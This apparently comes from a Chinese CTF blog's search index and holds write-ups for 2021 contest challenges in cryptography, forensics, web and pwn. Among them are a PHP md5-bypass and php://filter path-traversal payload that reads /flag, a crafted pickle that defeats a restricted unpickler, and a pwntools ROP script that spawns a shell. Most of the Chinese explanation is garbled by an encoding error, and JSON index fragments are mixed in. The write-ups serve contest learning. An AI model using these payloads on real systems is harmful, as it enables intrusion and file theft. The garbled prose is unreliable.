a)%aassert(x==6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478)assert(c == 13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129)assert(log(d)/log(2)&lt;=200)assert(log(z)/log(2)&lt;=1024) æ¨å¯¼ï¼š ç”± $rb \\equiv b^{-1} \\pmod a$ å’Œ $rd \\equiv d^{-1} \\pmod a$ ï¼Œæœ‰ $rb \\cdot b \\cdot rd \\cdot d = x \\cdot b \\cdot d \\equiv 1 \\pmod a$ã€‚ æ•…æ±‚å‡º $b \\equiv (x \\cdot d)^{-1} \\pmod a$ï¼Œ$rb \\equiv b^{-1} \\pmod a$ã€‚ åˆ $c = (m+z \\cdot rb \\cdot d) \\bmod a$ï¼Œæ„é€ æ ¼ $L=\\begin{bmatrix} 1 &amp; rb \\cdot d \\\\ 0 &amp; a \\end{bmatrix}$ï¼Œåˆ©ç”¨LLLç®—æ³•æ±‚è§£ï¼š 123456789101112131415161718192021222324252627a = 16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723d = 1004034638166310792730607806775703553124564601554345421260673x = 6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478c = 13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129import gmpy2b = gmpy2.invert(x*d,a)rb = gmpy2.invert(b,a)rd = gmpy2.invert(d,a)h = rb*d%ap = av1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);f, g = m.LLL()[0]f, g = -f, -g#print(f, g)a = f*c % p % gm = a * inverse_mod(f, g) % gprint(bytes.fromhex(hex(m)[2:]))#b&#x27;flag&#123;we1c0mE_t0_cr4aK_mE!&#125;&#x27; FLAG: flag&#123;we1c0mE_t0_cr4aK_mE!&#125; â€‹ MISCcheckin flag{W3Lc0m3_t0_2o2I_3n3rgy_contest} ç­¾åˆ°ã€‚ FLAG: flag&#123;W3Lc0m3_t0_2o2I_3n3rgy_contest&#125; â€‹ hardwire_1 ä¸‹è½½é™„ä»¶å‹ç¼©åŒ…ï¼Œåˆ†ææ–‡ä»¶ï¼Œæ‰¾åˆ°flagã€‚æäº¤flagæ ¼å¼ï¼šflag{xxxx}ã€‚ æµé‡åŒ…æ–‡ä»¶ï¼Œwiresharkæ‰“å¼€ï¼Œè¿½è¸ªTCPæµï¼Œå‘ç°èœåˆ€è¿æ¥æµé‡ç‰¹å¾ã€‚ è§£ææµ1ä¸­z2å‚æ•°å€¼ï¼Œbase64è§£ç å¾—ï¼š cd /d &quot;C:\\php\\htdocs&quot;&amp;winrar a -pf@l#ag102 key.rar key.jpg&amp;echo [S]&amp;cd&amp;echo [E] è§£ææµ3ä¸­z0å‚æ•°å€¼ï¼Œbase64è§£ç è½¬å­˜å¾—åˆ°Raræ–‡ä»¶ key.rarã€‚ ç»“åˆå‰é¢çš„è§£å‹å¯†ç  f@l#ag102ï¼Œè§£å‹å¾—åˆ° flag.jpgã€‚ FLAG: flag&#123;579a4da9e3375c9b96add11cf2915eb5&#125; â€‹ wava Do you know what is wava? é™„ä»¶move.zipæ— æ³•æ‰“å¼€ï¼Œ010editoræŸ¥çœ‹ä¸ºwavæ–‡ä»¶å¤´ï¼Œä¿®æ”¹åç¼€ï¼Œä½¿ç”¨audacityæ‰“å¼€æœªå‘ç°æœ‰ç”¨ä¿¡æ¯ã€‚ å›åˆ°16è¿›åˆ¶ä¸‹æŸ¥çœ‹ï¼Œå‘ç°åœ¨0x69å¤„å­˜åœ¨å¦ä¸€ä¸ªwavæ–‡ä»¶å¤´ï¼Œåˆ é™¤å‰é¢çš„æ–‡ä»¶å¤´ä¿å­˜ï¼Œé‡æ–°ä½¿ç”¨audacityæ‰“å¼€ï¼Œå‘ç°æ‘©æ–¯å¯†ç ï¼Œæ‰‹æ’¸ä¸‹æ¥å¾—åˆ°ï¼š ..-. .-.. .- --. ----- ....- -.. .---- -.. . -.... -.. -.... ...-- .- .- .---- -... ..... -... ..... ..... --... ...-- ..-. -.-. -.... . ----- ---.. . ...-- ----. -.... ..-. ----- è§£ç å¾—flagã€‚ FLAG: flag&#123;04d1de6d63aa1b5b5573fc6e08e396f0&#125; â€‹ WEBezphp æƒ³çœ‹äºŒæ¬¡å…ƒæœ‰å¾ˆå¤šéšœç¢(flagåœ¨/flag) ç‚¹æäº¤æŒ‰é’®å‡ºç°æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php if(!$_GET[&#x27;site&#x27;])&#123; ?&gt;&lt;html&gt; &lt;body&gt; æƒ³çœ‹ä¸ªäºŒæ¬¡å…ƒæ€ä¹ˆè¿™ä¹ˆéš¾&lt;form action=&#x27;&#x27; method=&#x27;GET&#x27;&gt; &lt;input type=&#x27;submit&#x27; name=&#x27;submit&#x27; /&gt; &lt;input type=&#x27;text&#x27; name=&#x27;site&#x27; style=&quot;width:1000px&quot; value=&quot;https://bilibili.com/&quot;/&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; &lt;?php die(); &#125;show_source(__FILE__);if (($_GET[&#x27;user&#x27;]===$_GET[&#x27;password&#x27;])||(md5($_GET[&#x27;user&#x27;])!=md5($_GET[&#x27;password&#x27;]))) die();$url = $_GET[&#x27;site&#x27;]; $path = $_GET[&#x27;path&#x27;];$url_schema = parse_url($url); $host = $url_schema[&#x27;host&#x27;]; $request_url = $url.&quot;/v/popular/all&quot;.$path; $res = file_get_contents($request_url);if (strstr($res,&quot;flag&quot;)) die(&quot;you can&#x27;t see my flag&quot;);if($res)&#123; echo &quot;&lt;h1&gt;Source Code:&lt;/h1&gt;&quot;; echo $request_url; echo &quot;&lt;hr /&gt;&quot;; echo $res; &#125;else&#123; echo &quot;get source failed&quot;; &#125; ?&gt; ç¬¬ä¸€å±‚ï¼ŒPHP md5å¼±æ¯”è¾ƒæ€§è´¨ç»•è¿‡ï¼šuser[]=1&amp;password[]=2 ç¬¬äºŒå±‚ï¼ŒPHPä¼ªåè®®æ‹¼æ¥ç»•è¿‡å…³é”®è¯+ç›®å½•ç©¿è¶Šï¼šsite=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag payload: ?submit=%E6%8F%90%E4%BA%A4&amp;site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag&amp;user[]=1&amp;password[]=2 å¾—åˆ°ZmxhZ3tqWkV0NkNrRmNSOFNHbVBCTjJobDVvcjBYVzRUM251TX0Kï¼Œbase64è§£ç å¾—flagã€‚ FLAG: flag&#123;jZEt6CkFcR8SGmPBN2hl5or0XW4T3nuM&#125; â€‹ EZpy pickleååºåˆ—åŒ– åŠ å‚æ•° ?source=1 å¾—åˆ°æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import base64import ioimport sysimport pickleimport bfrom flask import Flask, Response, render_template, requestapp = Flask(__name__)def read(filename, encoding=&#x27;utf-8&#x27;): with open(filename, &#x27;r&#x27;, encoding=encoding) as fin: return fin.read()class people: def __init__(self, name, sex, age): self.name = name self.sex = sex self.age=age def __repr__(self): return f&#x27;people(name=&#123;self.name!r&#125;, category=&#123;self.sex!r&#125;, age=&#123;self.age!r&#125;)&#x27; #==åˆ¤æ–­ def __eq__(self, other): return type(other) is people and self.name == other.name and self.sex == other.sex and self.age==other.ageclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module[0:8] == &#x27;__main__&#x27;: return getattr(sys.modules[&#x27;__main__&#x27;], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def here_load(s): return RestrictedUnpickler(io.BytesIO(s)).load()@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def index(): if request.args.get(&#x27;source&#x27;): return Response(read(__file__),mimetype=&#x27;text/plain&#x27;) else: return Response(&quot;/?source=&quot;)@app.route(&#x27;/app&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def inll(): if request.method == &#x27;POST&#x27;: try: pickle_data = request.form.get(&#x27;data&#x27;) if b&#x27;R&#x27; in base64.b64decode(pickle_data): return &#x27;no no no&#x27; else: result = here_load(base64.b64decode(pickle_data)) if type(result) is not people: return &#x27;ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ&#x27; correct = (result == people(b.name, b.sex, b.age)) if correct: return Response(read(&#x27;/flag.txt&#x27;)) except Exception as e: return Response(str(e)) test = people(&#x27;test&#x27;, &#x27;test&#x27;,&#x27;55&#x27;) pickle_data = base64.b64encode(pickle.dumps(test)).decode() return Response(pickle_data)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8000) é™åˆ¶ä¸­ï¼Œæ”¹å†™äº†find_classå‡½æ•°ï¼Œåªèƒ½ç”Ÿæˆ__main__æ¨¡å—çš„pickleï¼Œæ­¤å¤–ï¼Œç¦æ­¢äº†b&#39;R&#39;ã€‚ ç›®æ ‡æ˜¯è¦†ç›– b ä¸­çš„éªŒè¯ï¼Œç”±äº b è¢«ä¸»ç¨‹åºå¼•å…¥ï¼Œæ˜¯å­˜åœ¨äº__main__ä¸‹çš„ b æ¨¡å—ä¸­çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¦†ç›–æ‰ï¼Œæ­¤æ—¶å°±æˆåŠŸç»•è¿‡äº†é™åˆ¶ï¼š 12345678910111213141516171819202122232425262728293031323334import ioimport sysimport pickleimport base64class people: def __init__(self, name, sex, age): self.name = name self.sex = sex self.age=age def __repr__(self): return f&#x27;people(name=&#123;self.name!r&#125;, category=&#123;self.sex!r&#125;, age=&#123;self.age!r&#125;)&#x27; def __eq__(self, other): return type(other) is people and self.name == other.name and self.sex == other.sex and self.age==other.age #print(pickle.dumps(people(&#x27;aaa&#x27;,&#x27;bbb&#x27;,&#x27;ccc&#x27;)))data=b&#x27;&#x27;&#x27;c__main__b(S&#x27;name&#x27;S&quot;aaa&quot;S&quot;sex&quot;S&quot;bbb&quot;S&quot;age&quot;S&quot;ccc&quot;db0(S&quot;aaa&quot;S&quot;bbb&quot;S&quot;ccc&quot;i__main__people.&#x27;&#x27;&#x27;print(base64.b64encode(data).decode())#Y19fbWFpbl9fCmIKKFMnbmFtZScKUyJhYWEiClMic2V4IgpTImJiYiIKUyJhZ2UiClMiY2NjIgpkYjAoUyJhYWEiClMiYmJiIgpTImNjYyIKaV9fbWFpbl9fCnBlb3BsZQou POSTæ–¹å¼åœ¨ /app è·¯ç”±ä¼ å…¥å‚æ•° dataï¼Œå¾—åˆ°flagã€‚ FLAG: flag&#123;2Vl49keFDTMN3frBo6HOYw0djCGzIcPQ&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2021ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›","slug":"match-2021ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›","date":"2021-09-11T17:14:50.000Z","updated":"2021-09-11T19:04:16.364Z","comments":true,"path":"2021/09/12/match-2021ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›/","permalink":"https://lazzzaro.github.io/2021/09/12/match-2021%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"â€‹ å¤§èµ›ç”±ä¸­å…±å¹¿å·å¸‚å§”ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–å§”å‘˜ä¼šåŠå…¬å®¤ä½œä¸ºæŒ‡å¯¼å•ä½ï¼Œå¹¿å·å¸‚ç½‘ç»œå®‰å…¨äº§ä¸šä¿ƒè¿›ä¼šä¸»åŠï¼Œå¹¿ä¸œå¤–è¯­å¤–è´¸å¤§å­¦ã€æ·±ä¿¡æœç§‘æŠ€è‚¡ä»½æœ‰é™å…¬å¸æ‰¿åŠï¼Œå¹¿å·å¸‚ä¿¡æ¯å®‰å…¨æµ‹è¯„ä¸­å¿ƒã€å¹¿å·äº’è”ç½‘åä¼šååŠã€‚ å¤§èµ›ä»¥â€œç½‘ç»œå®‰å…¨ä¸ºäººæ°‘ã€ç½‘ç»œå®‰å…¨é äººæ°‘â€ä¸ºä¸»é¢˜ï¼Œæ—¨åœ¨é€šè¿‡ç«èµ›çš„æ–¹å¼æé«˜å‚èµ›é€‰æ‰‹æ”»é˜²å…¼å¤‡çš„ç½‘ç»œå®‰å…¨å®è·µæŠ€èƒ½ï¼Œå®ç°ä»¥èµ›ä¿ƒå­¦ã€ä»¥èµ›ä¼šå‹ï¼ŒåŠ å¼ºä¸åŒé™¢æ ¡åŠå•ä½é—´çš„æŠ€æœ¯äº¤æµã€‚ Rank: ä¼äº‹ä¸šå•ä½ç»„12 ReverseEz_android Just an easy sign in! jadxæŸ¥çœ‹MainActivityç±»ã€‚ onClinkå‡½æ•°å…ˆéªŒè¯usernameå’Œpasswordï¼Œåœ¨èµ„æºæ–‡ä»¶æŸ¥åˆ°usernameä¸ºadminï¼ŒåŠ å¯†å¤„ç†åçš„passwordå€¼ä¸ºc232666f1410b3f5010dc51cec341f58ï¼ŒåˆgetEncodeStrå‡½æ•°å¯¹passwordçš„md5ç»“æœæ¯ä¸€byteåšäº†å‡1å¤„ç†ï¼Œè¿˜åŸå¾—åˆ°c33367701511b4f6020ec61ded352059ï¼ŒæŸ¥åˆ°å¯¹åº”çš„åŸå€¼ä¸º654321ã€‚ æ¥ä¸‹æ¥æ‰§è¡ŒgetKeyAndRedirectå‡½æ•°ï¼Œä¼ å…¥passwordå€¼654321ï¼Œè¿›å…¥socketäº¤äº’ï¼ˆnc 139.224.191.201 20080ï¼‰ï¼Œè¾“å…¥passwordï¼Œæ‹¿åˆ°keyå­—ç¬¦ä¸²ï¼š key=TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom åœ¨getKeyAndRedirectå‡½æ•°ä¸­æœ€åå°†keyä¼ é€’åˆ°CheckFlagActivityï¼Œåœ¨CheckFlagActivityä¸­checkFlagå‡½æ•°è°ƒç”¨EncodeUtilsç±»å®ç°base64ç¼–ç ï¼Œkeyä¸ºç è¡¨ï¼ŒencodeFlagä¸ºç¼–ç ç»“æœï¼š encodeFlag=3lkHi9iZNK87qw0p6U391t92qlC5rwn5iFqyMFDl1t92qUnL6FQjqln76l-P è·‘æ›´æ¢ç è¡¨base64è§£ç ç®—æ³•è¿˜åŸflagï¼šSangFor{212f4548-03d1-11ec-ab68-00155db3a27e} â€‹ PWNBabyRopæœ‰systemå‡½æ•°å’Œ/cin/shï¼Œç®€å•ROPï¼Œç¼ºå°‘çš„/bin/sh\\x00å¯ä»¥ç”¨sh\\x00ä»£æ›¿ã€‚ 12345678910111213141516171819#coding:utf-8from pwn import *context.log_level = &#x27;debug&#x27;p = remote(&#x27;192.168.42.14&#x27;, 11000)elf = ELF(&#x27;./BabyRop&#x27;)sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)sh_addr = 0x0804c029system_addr = 0x80490a0pay = &#x27;A&#x27; * (0x28 + 4) + p32(system_addr) + p32(0) + p32(sh_addr)pause()sl(pay)p.interactive() â€‹ CryptoRingRingRing ring a ring a ring ring a ring a ring ncæµ‹è¯•md5-PoWä¹‹åï¼Œéœ€è¦è¾“å…¥100ç»„a,b,c,d,eï¼Œä½¿å¾— $a^4+b^4+c^4+d^4=e^2$ï¼Œä¸”éƒ½ä¸èƒ½ä¸º0ã€‚ æ„é€  $1^4+1^4+1^4+1^4=2^2$ï¼Œå†æŒ‰å€æ•°åšä¹˜ç§¯ $k^4+k^4+k^4+k^4=(2k^2)^2,k \\in [1,100]$ï¼Œå¾—åˆ°100ç»„ç”¨ä¾‹ã€‚ 123456789101112131415161718192021222324from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom hashlib import md5def brute_force(prefix,s): return bruteforce(lambda x:md5(x+prefix).hexdigest()[0:5]==s,string.ascii_letters+string.digits,length=4,method=&#x27;fixed&#x27;)r=remote(&#x27;192.168.42.14&#x27;,2378)prefix, s = parse(&quot;Please find a string that md5(str + &#123;&#125;)[0:5] == &#123;&#125;&quot;,r.recvline())r.sendlineafter(&#x27;[&gt;] Give me xxxxx: &#x27;,brute_force(prefix,s))r.recvline()r.recvline()for i in range(1,101): r.sendlineafter(&#x27;[&gt;] a: &#x27;,str(i)) r.sendlineafter(&#x27;[&gt;] b: &#x27;,str(i)) r.sendlineafter(&#x27;[&gt;] c: &#x27;,str(i)) r.sendlineafter(&#x27;[&gt;] d: &#x27;,str(i)) r.sendlineafter(&#x27;[&gt;] e: &#x27;,str(2*i*i)) print(r.recvline())print(r.recvline())#GWHT&#123;a_funny_equation&#125; â€‹ Easy_Rsa ä½ äº†è§£RSAå—??? 12345678910111213141516171819202122232425262728293031323334353637from Crypto.Util.number import *from flag import flagimport gmpy2def gen_prime(nbits, gamma): g = getPrime(int(nbits * gamma)) alpha = 0.5 - gamma while True: a = getRandomNBitInteger(int(alpha * nbits)) p = 2 * g * a + 1 if isPrime(p): b = getRandomNBitInteger(int(alpha * nbits)) q = 2 * g * b + 1 h = 2 * g * a * b + a + b while not isPrime(q) or isPrime(h) or gmpy2.gcd(a, b) != 1: b = getRandomNBitInteger(int(alpha * nbits)) q = 2 * g * b + 1 return p, qdef encrypt(nbits, gamma): p, q = gen_prime(nbits, gamma) n = p * q e = getPrime(16) while gmpy2.gcd(e, gmpy2.lcm(p-1,q-1)) != 1: e = getPrime(16) m = bytes_to_long(flag) c = pow(m, e, n) return n, e, cn, e, c = encrypt(1024, 0.48)print &#x27;n =&#x27;, nprint &#x27;e =&#x27;, eprint &#x27;c =&#x27;, c# n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039# e = 58337# c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668 å…±ç´ æ•°æ”»å‡»ï¼ˆcommon prime RSAï¼‰ã€‚ ç»™å‡º $N=pq,p-1=2ga,q-1=2gb,h=2gab+a+b$ï¼Œæœ‰ $N-1=2gh$ï¼Œ æ‰€ä»¥ $x^{N-1} \\pmod p$ è‡³å¤šæœ‰ $a$ ä¸ªå€¼ï¼Œç”¨ $x \\rightarrow x^{N-1}+3$ ä»£æ›¿ Pollardâ€™s rhoç®—æ³•ä¸­è¿­ä»£å‡½æ•°ï¼Œèƒ½åœ¨ $\\text{O}(\\sqrt{a})=\\text{O}(N^{\\frac{1}{4}-\\frac{\\gamma}{2}})$ ä¸‹åˆ†è§£ $N$ã€‚ common prime RSAåœ¨ $g$ è¿‡å°æ—¶ï¼Œ $g$ ä¹Ÿèƒ½è½»æ˜“é€šè¿‡åˆ†è§£ $N-1$ æ¥è§£å‡ºã€‚ 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *import gmpy2def f(x, n): return (pow(x, n - 1, n) + 3) % ndef rho(n): i = 1 while True: a = getRandomRange(2, n) b = f(a, n) j = 1 while True: p = GCD(abs(a - b), n) print(&#x27;&#123;&#125; in &#123;&#125; circle&#x27;.format(j, i)) if p == n: break elif p &gt; 1: return (p, n // p) else: a = f(a, n) b = f(f(b, n), n) j += 1 i += 1n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039e = 58337c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668p, q = rho(n)d = gmpy2.invert(e, (p-1)*(q-1))m = pow(c, d, n)print(bytes.fromhex(hex(m)[2:]))#b&#x27;SangFor&#123;0a8c2220-4c1b-32c8-e8c1-adf92ec7678b&#125;&#x27; â€‹ Bigrsa BigRSAï¼ 123456789101112131415from Crypto.Util.number import *from flag import *n1 = 103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061n2 = 115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073e = 65537m = bytes_to_long(flag)c = pow(m, e, n1)c = pow(c, e, n2)print(&quot;c = %d&quot; % c)# output# c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264 å°è¯•å‘ç° $\\gcd(n_1,n_2)=p$ï¼Œåˆ†åˆ«æ±‚å‡º $q_1=n_1/p,q_2=n_2/p$ï¼Œå†ç”¨å¸¸è§„è§£å¯†æ–¹æ³•ä¸¤æ­¥æ±‚å‡º $m$ï¼š 123456789101112131415import gmpy2n1 = 103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061n2 = 115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073e = 65537c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264p = gmpy2.gcd(n1,n2)q1 = n1 // pq2 = n2 // pd1 = gmpy2.invert(e, (p-1)*(q1-1))d2 = gmpy2.invert(e, (p-1)*(q2-1))c = pow(c, d2, n2)m = pow(c, d1, n1)print(bytes.fromhex(hex(m)[2:]))#b&#x27;SangFor&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;&#x27; â€‹ Miscç­¾åˆ°é¢˜ ç®€ç®€å•å•çŒœæ•°å­—01-30 SangFor{md5(---â€¦..)}ï¼ˆ32ä½md5ï¼‰ 12å¼ å›¾åˆ†åˆ«å¾—åˆ°å…³é”®æ•°å­—ï¼š28-08-30-07-04-20-02-17-23-01-12-19ï¼Œmd5å¾—flagï¼šSangFor{d93b7da38d89c19f481e710ef1b3558b} â€‹ Misc520 æœ‰ä¸€å¤©ï¼Œzipçˆ±ä¸Šäº†pcapï¼Œzipä¸ºäº†èƒ½ä¸pcapåˆ›é€ æ›´å¤šæœºä¼šï¼Œä¸æ–­åœ°å°†è‡ªå·±çš„èƒ½åŠ›è¡¨ç°å‡ºæ¥ã€‚å¯æ˜¯ï¼ŒLSBStegå´çªç„¶æ€äº†å‡ºæ¥ï¼Œå°†pcapåå¹¶äºpngä¸­ï¼Œä¸æ”¾å‡ºæ¥ã€‚zipçœ‹åˆ°äº†pngï¼Œå¤šå–çƒ­æ°´å°‘åšæ¢¦ã€‚zipå¼‚å¸¸çš„æ„¤æ€’ï¼Œä¸æ–­åœ°ç”¨è‡ªå·±çš„èƒ½åŠ›å»æŠ¥å¤pngï¼Œä¸è®©pngé€ƒèµ°ã€‚è‡³ä»Šï¼Œzipä»æœªé‡Šæ€€ã€‚ã€‚ã€‚ æ‹¿åˆ°520.zipå‹ç¼©åŒ…ï¼Œå¾ªç¯åµŒå¥—ç€520å±‚zipå’Œstoryæ–‡ä»¶ï¼Œè„šæœ¬è§£å‹å‡ºæ‰€æœ‰æ–‡ä»¶ï¼ˆæ¯æ¬¡è§£å‹å°†storyæ–‡ä»¶é‡å‘½åé˜²è¦†ç›–ï¼‰ï¼š 12345678910111213141516171819202122import zipfile import osnow = &quot;520.zip&quot;while 1: print(&quot;~~&quot;+now) zfile = zipfile.ZipFile(now) zfile.extractall(members=zfile.namelist()) zfile.close() try: os.remove(now) except OSError as e: print(e) names = os.listdir() os.rename(&#x27;story&#x27;,&#x27;story&#x27;+now.split(&#x27;.&#x27;)[0]) print(names) for name in names: if name.endswith(&#x27;.zip&#x27;) and name != now: now=name break print(&#x27;~~~~&#x27;+now) è§£å‡ºæœ€é‡Œå±‚æ˜¯ä¸€å¼ flag.pngå›¾ç‰‡ï¼ŒæŒ‰å¤§å°æ’åºç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œå‘ç°story150å†…å®¹ä¸å…¶ä»–ä¸åŒï¼š 123456è¿™éƒ½è¢«ä½ å‘ç°äº†ï¼Ÿæˆ‘è¿™æ•…äº‹ä¸é”™å§ï¼Œå˜»å˜»å˜»é‚£å°±æŠŠflagç»™ä½ å§ohï¼Œä¸ï¼Œè¿˜æœ‰ä¸€åŠè—åœ¨äº†pcapçš„å¿ƒé‡Œï¼Œå¿«å»æ‰¾æ‰¾å§å·¦å¿ƒæˆ¿å³å¿ƒæˆ¿ï¼Œæ‰‘é€šæ‰‘é€šçš„å¿ƒï¼Œå’¿å‘€å’¿å‘€çš„â¤72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108, å¾—åˆ°æ•°å­— 72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108, æ ¹æ®æç¤ºï¼ŒzstegæŸ¥çœ‹pngå›¾ç‰‡å­˜åœ¨lsbéšå†™ï¼ŒæŒ‰bgræ–¹å¼æå–å‡ºä¸€ä¸ªzipåŠ å¯†å‹ç¼©åŒ…ï¼Œçˆ†ç ´å¾—å¯†ç 12345è§£å‡ºflag.pcapã€‚ wiresharkæŸ¥çœ‹å‘ç°å…¨ä¸ºUSBæµé‡ï¼Œtsharkæå–ï¼š tshark -r flag.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txt å°†é¼ æ ‡æ•°æ®è¿˜åŸé¼ æ ‡ç§»åŠ¨è½¨è¿¹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940f=open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)fi=open(&#x27;out.txt&#x27;,&#x27;w&#x27;)while 1: a=f.readline().strip() if a: if len(a)==8: out=&#x27;&#x27; for i in range(0,len(a),2): if i+2 != len(a): out+=a[i]+a[i+1]+&quot;:&quot; else: out+=a[i]+a[i+1] fi.write(out) fi.write(&#x27;\\n&#x27;) else: breakfi.close()nums = []keys = open(&#x27;out.txt&#x27;,&#x27;r&#x27;)f = open(&#x27;xy.txt&#x27;,&#x27;w&#x27;)posx = 0posy = 0for line in keys: if len(line) != 12 : continue x = int(line[3:5],16) y = int(line[6:8],16) if x &gt; 127 : x -= 256 if y &gt; 127 : y -= 256 posx += x posy += y btn_flag = int(line[0:2],16) # 1 for left , 2 for right , 0 for nothing f.write(str(posx)) f.write(&#x27; &#x27;) f.write(str(posy)) f.write(&#x27;\\n&#x27;)f.close() æœ€ågnuplotåšå›¾ï¼š gnuplot&gt; plot &quot;xy.txt&quot; å¾—åˆ°ååŠéƒ¨åˆ†æ•°å­—ï¼š130, 63, 111, 94, 51, 134, 119, 146 ç»“åˆflagæ ¼å¼ï¼Œæ¨çŸ¥ä¸ºå˜å¼‚å‡¯æ’’ç§»ä½è§£å¯†ï¼Œè§£å‡ºï¼š [71, 87, 72, 84, 123, 87, 51, 108, 67, 111, 109, 51, 95, 116, 48, 95, 77, 33, 115, 99, 125] 